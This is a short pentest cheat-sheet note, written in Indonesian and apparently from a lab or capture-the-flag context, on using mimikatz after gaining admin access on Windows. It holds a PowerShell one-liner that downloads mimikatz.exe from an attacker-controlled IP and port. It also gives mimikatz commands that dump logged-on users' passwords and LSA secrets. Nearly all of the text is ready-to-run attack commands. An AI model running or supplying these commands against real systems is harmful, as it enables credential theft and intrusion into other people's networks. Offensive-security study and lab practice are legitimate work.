https://www.offsec.com/metasploit-unleashed/mimikatz/

Extract credential from memory windows, sebenarnya lebih mudah paket `impacket-secretsdump` tapi tools itu lagi ada bug 🐞.
Tools untuk post-exploitation, artinya tools ini bisa bekerja kalau kita punya akun admin

# Chek infra
```powershell
sysinfo

# or
echo %PROCESSOR_ARCHITECTURE%
```
![](Attachments/Pasted%20image%2020260814104031.png)
# Upload
```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.15.236:8088/mimikatz.exe', 'mimikatz.exe')"
```

# First thing to do
extra semua password yang pernah login
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
![](Attachments/Pasted%20image%2020260814111416.png)

Local LSA Secrets
```powershell
mimikatz.exe "privilege::debug" "lsadump::secrets" exit
```